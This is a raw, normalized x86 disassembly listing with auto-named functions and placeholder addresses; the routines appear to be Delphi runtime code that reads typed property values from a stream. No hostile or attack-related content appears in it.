lea ecx [ ebp - 0x20 ]
lea edx [ ebp - 0x9 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x8 ]
call sub_418474
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_418474
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2c ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x1c ]
mov [ ebp - 0x28 ] eax
xor eax eax
push ebp
push sub_4173b9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
test [ ebp - 0x9 ] 0x1
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x28 ]
mov [ eax + 0x1c ] edx
retn
xor eax eax
push ebp
push sub_417377
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov eax [ ebp - 0x14 ]
call sub_416e14
pop ecx
mov eax [ ebp - 0x14 ]
or [ eax + 0x1c ] 0x1
push ebp
mov dl 0x1
mov ax [ r-xdata ]
call sub_416e8c
pop ecx
test [ ebp - 0x9 ] 0x1
jne r-xdata
push ebp
call sub_416f74
pop ecx
push ebp
call sub_417124
pop ecx
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
push ebp
call sub_417084
pop ecx
mov eax [ ebp - 0x14 ]
test [ eax + 0x1d ] 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
call sub_403aa4
jmp r-xdata
mov eax [ ebp - 0x14 ]
or [ eax + 0x1c ] 0x2
push ebp
mov dl 0x1
mov ax [ r-xdata ]
call sub_416e8c
pop ecx
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0x14 ]
and [ eax + 0x1c ] 0xfffd
push ebp
xor edx edx
mov ax [ r-xdata ]
call sub_416e8c
pop ecx
test [ ebp - 0x9 ] 0x2
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x14 ]
mov [ eax + 0x1c ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4173f0
lea eax [ ebp - 0x1c ]
mov edx 0x2
call sub_403fe0
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_404f7c
retn
test [ ebp - 0x9 ] 0x1
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x2c ]
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x14 ]
mov si 0xfff9
call sub_403468
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_413a24
test eax eax
jge r-xdata
mov eax [ ebp - 0x14 ]
test [ eax + 0x1d ] 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
push ebp
mov eax [ ebp - 0x14 ]
call sub_416dd8
pop ecx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_41386c
jmp r-xdata
push ebp
mov eax [ ebp - 0x14 ]
call sub_416dd8
pop ecx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
call sub_41386c
sub_41737c
push ebp
call sub_416ef4
pop ecx
test al al
je r-xdata
call sub_403a20
call sub_403a74
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x24 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x28 ]
mov [ eax + 0x1c ] edx
retn
mov eax [ ebp - 0x14 ]
call sub_40326c
sub_417404
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_417474
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_40323c
mov edx [ ebp - 0x4 ]
mov [ edx + 0x30 ] eax
xor eax eax
push ebp
push sub_41745f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_417474
mov eax [ ebp - 0x4 ]
call sub_4169c4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_416b08
retn
sub_417474
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4168ac
test al al
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_41797c
mov eax [ ebp - 0x4 ]
call sub_417818
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ ebp - 0xc ] eax
mov eax ebx
mov si 0xfffb
call sub_403468
mov edx [ ebp - 0x4 ]
mov [ edx + 0x2c ] eax
xor eax eax
push ebp
push sub_417536
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov si 0xfffc
call sub_403468
mov edi eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x28 ] edi
test edi edi
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4168ac
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4171c8
mov eax [ ebp - 0x4 ]
call sub_417818
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41753d
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x2c ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x28 ] edx
retn
sub_417544
push ebx
add esp 0xffffffec
mov ebx eax
mov eax ebx
call sub_418650
cmp al 0x5
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_4177cc
mov [ esp + 0xc ] eax
mov [ esp + 0x10 ] edx
fild [ esp + 0xc ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0xa
mov eax ebx
call sub_416c14
jmp r-xdata
fld [ esp ]
add esp 0x14
pop ebx
retn
sub_417588
push ebx
add esp 0xfffffff4
mov ebx eax
mov eax ebx
call sub_418650
cmp al 0xf
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_4177cc
mov [ esp + 0x4 ] eax
mov [ esp + 0x8 ] edx
fild [ esp + 0x4 ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_416c14
jmp r-xdata
fld [ esp ]
add esp 0xc
pop ebx
retn
sub_4175cc
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_418650
cmp al 0x10
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_4177cc
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_416c14
jmp r-xdata
fild [ esp ]
add esp 0x10
pop ebx
retn
sub_41761c
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_418650
cmp al 0x11
jne r-xdata
dec [ ebx + 0x10 ]
mov eax ebx
call sub_4177cc
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_416c14
jmp r-xdata
fld [ esp ]
add esp 0x10
pop ebx
retn
sub_417660
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_418650
and eax 0x7f
cmp eax 0xd
ja r-xdata
call sub_4166ec
mov al [ eax + lookup_table_417687 ]
jmp [ eax * 4 + jump_table_417695 ]
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_416c14
xor ecx ecx
mov cl [ esp ]
mov eax esi
xor edx edx
call sub_4040ac
mov eax esi
call j_sub_404488
mov edx eax
xor ecx ecx
mov cl [ esp ]
mov eax ebx
call sub_416c14
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_404010
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_404010
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_404010
jmp r-xdata
mov eax esi
mov edx r-xdata
call sub_404010
jmp r-xdata
pop edx
pop esi
pop ebx
retn
sub_417760
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_418650
sub al 0x2
je r-xdata
lea edx [ esp + 0x4 ]
mov ecx 0x1
mov eax ebx
call sub_416c14
movsx eax [ esp + 0x4 ]
mov [ esp ] eax
jmp r-xdata
dec al
je r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop ebx
retn
lea edx [ esp + 0x6 ]
mov ecx 0x2
mov eax ebx
call sub_416c14
movsx eax [ esp + 0x6 ]
mov [ esp ] eax
jmp r-xdata
dec al
je r-xdata
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_416c14
jmp r-xdata
jmp r-xdata
call sub_4166ec
sub_4177cc
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_416bf0
cmp al 0x13
jne r-xdata
mov eax ebx
call sub_417760
cdq
mov [ esp ] eax
mov [ esp + 0x4 ] edx
mov eax ebx
call sub_418650
mov edx esp
mov ecx 0x8
mov eax ebx
call sub_416c14
jmp r-xdata
mov eax [ esp ]
mov edx [ esp + 0x4 ]
pop ecx
pop edx
pop ebx
retn
sub_417820
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov al [ r-xdata ]
mov [ esi ] al
mov eax ebx
call sub_416bf0
and al 0xf0
cmp al 0xf0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_418650
and al 0xf
mov [ esi ] al
test [ esi ] 0x2
je r-xdata
mov eax ebx
call sub_417760
mov [ edi ] eax
sub_41785d
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffedc
push ebx
xor edx edx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_417951
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_403fbc
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x8 ]
call sub_404054
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x124 ] eax
mov [ ebp - 0x120 ] 0xb
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x11c ] eax
mov [ ebp - 0x118 ] 0xb
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ ebp - 0x114 ] eax
mov [ ebp - 0x110 ] 0xb
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x124 ]
push eax
push 0x3
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b50c
call sub_4039f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417958
lea edx [ ebp - 0x104 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
call sub_4031bc
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_404220
sub_41797c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_417b4c
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
push ebp
push j_sub_403838#2
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_418474
xor edx edx
push ebp
push j_sub_403838
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx 0x1
mov eax [ ebp - 0x8 ]
call sub_40427c
mov esi eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x1
cmp esi ebx
jl r-xdata
mov eax [ ebp - 0xc ]
add eax 0x70
push eax
mov ecx ebx
sub ecx edi
mov edx edi
mov eax [ ebp - 0x8 ]
call sub_4044dc
cmp esi ebx
jl r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + ebx - 0x1 ] 0x2e
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_4034ac
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x70 ]
call sub_4107e8
mov edi eax
test edi edi
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_4034ac
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x70 ]
call sub_4107e8
mov edi eax
test edi edi
jne r-xdata
inc ebx
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x0
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0xc ]
mov [ eax + 0x78 ] 0x1
mov eax [ ebp - 0xc ]
cmp [ eax + 0x70 ] 0x0
je r-xdata
mov ecx edi
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_417d00
jmp r-xdata
xor eax eax
mov [ ebp - 0x14 ] eax
mov eax [ edi ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x70 ]
mov eax [ ebp - 0xc ]
call sub_416c00
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x70 ]
mov eax [ ebp - 0xc ]
call sub_416c00
mov eax [ ebp - 0x14 ]
mov edx [ r-xdata ]
call sub_4033f8
test al al
jne r-xdata
mov edx edi
mov eax [ ebp - 0x10 ]
call sub_410858
mov [ ebp - 0x14 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
inc ebx
jmp r-xdata
push ebp
call sub_417960
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417b53
lea eax [ ebp - 0x8 ]
call sub_403fbc
retn
mov edi ebx
jmp r-xdata
sub_417b06
add [ eax ] eax
add [ eax ] al
in al dx
outsb
inc eax
add [ edx ] dl
jpo r-xdata
add [ ecx - 0xbba743d ] cl
cmp [ eax + 0x78 ] 0x0
je r-xdata
call sub_403a20
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
test al al
jne r-xdata
call sub_403a74
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417b53
lea eax [ ebp - 0x8 ]
call sub_403fbc
retn
sub_417b5c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ esi ]
mov eax [ eax ]
call sub_4133bc
mov ebx eax
test ebx ebx
je r-xdata
call sub_4166ec
lea edx [ ebp - 0x8 ]
mov eax edi
call ebx
test al al
je r-xdata
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4108cc
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_417ba4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
push eax
push esi
push 0x0
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_416180
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_41386c
pop edi
pop esi
pop ebx
pop ebp
retn
sub_417be4
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
xor eax eax
push ebp
push sub_417c33
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_418d68
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_410d68
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417c3a
lea eax [ ebp - 0x10 ]
call sub_40e93c
retn
sub_417c40
push ebp
mov ebp esp
push 0x0
push 0x0
xor eax eax
push ebp
push sub_417cf2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_416bf0
cmp al 0xd
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_417660
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_416180
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_41386c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_418650
lea eax [ ebp - 0x4 ]
call sub_405628
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ ebp - 0x4 ]
call sub_410e1c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417cf9
lea eax [ ebp - 0x8 ]
call sub_403fbc
lea eax [ ebp - 0x4 ]
call sub_405628
retn
sub_417d00
push ebp
mov ebp esp
push ecx
mov ecx 0x5
push 0x0
push 0x0
dec ecx
jne r-xdata
xchg [ ebp - 0x4 ] ecx
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_417ffb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov ebx [ eax ]
xor eax eax
mov al [ ebx ]
cmp eax 0x10
ja r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418002
lea eax [ ebp - 0x2c ]
mov edx 0x2
call sub_403fe0
lea eax [ ebp - 0x24 ]
call sub_40469c
lea eax [ ebp - 0x20 ]
mov edx 0x3
call sub_403fe0
retn
jmp [ eax * 4 + jump_table_417d90 ]
mov eax [ rw-data ]
call sub_4166d4
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410858
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_416bf0
cmp al 0x7
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_416cb0
xor ecx ecx
mov cl al
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4108cc
jmp r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_417660
mov edx [ ebp - 0x1c ]
mov eax ebx
call sub_410784
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4108cc
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_417544
add esp 0xfffffff4
fstp [ esp ]
fwait
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410b5c
jmp r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_4184b0
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410a5c
jmp r-xdata
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_41856c
mov ecx [ ebp - 0x24 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410a88
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_418394
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4108cc
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_416bf0
sub al 0xd
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_416bf0
cmp al 0xd
jne r-xdata
push ebp
call sub_417be4
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4177cc
push edx
push eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410de0
jmp r-xdata
push ebp
call sub_417c40
pop ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410858
test [ eax + 0x24 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_417760
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4108cc
jmp r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_417660
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_417b5c
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_418650
xor ecx ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4108cc
jmp r-xdata
dec al
je r-xdata
lea edx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
call sub_417660
mov ecx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_418650
mov ecx rw-data
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410da8
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_418650
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410858
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_416d08
jmp r-xdata
jmp r-xdata
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_410da8
jmp r-xdata
push ebp
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_417660
mov ecx [ ebp - 0x28 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_417ba4
pop ecx
jmp r-xdata
sub_418008
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
xor esi esi
mov eax ebx
mov edx edi
call sub_404010
jmp r-xdata
mov eax [ ebx ]
call sub_413554
test al al
je r-xdata
inc esi
push ebx
mov [ ebp - 0x10 ] edi
mov [ ebp - 0xc ] 0xb
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x10 ]
mov ecx 0x1
mov eax r-xdata
call sub_408b94
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_418068
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x28 ] ecx
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_418383
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_418450
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_418361
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_418322
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x11 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_418474
mov eax [ ebp - 0xc ]
test [ eax + 0x1c ] 0x10
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_418474
mov eax [ ebp - 0x1c ]
call sub_413128
xor ecx ecx
mov dl 0x1
call [ eax + 0x2c ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_418474
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov eax [ ebp - 0xc ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp - 0xc ]
or [ eax + 0x1c ] 0x2
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_418474
mov eax [ ebp - 0x30 ]
lea edx [ ebp - 0x2c ]
call sub_418008
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_418474
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x18 ] edx
push 0x1
mov eax [ ebp - 0xc ]
call sub_4031b4
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_412e78
mov edx [ ebp - 0x4 ]
mov [ edx + 0x74 ] eax
xor eax eax
push ebp
push sub_4182c7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x1c ] edx
call sub_405d58
mov eax [ eax + 0x8 ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40323c
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x34 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
or [ eax + 0x1c ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
or [ eax + 0x1c ] 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
and [ eax + 0x1c ] 0xfffd
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_41386c
xor eax eax
push ebp
push sub_4182a7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_413a24
test eax eax
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4182ae
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x34 ] edx
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_40326c
inc ebx
mov [ ebp - 0x10 ] 0x0
mov eax [ ebp - 0x4 ]
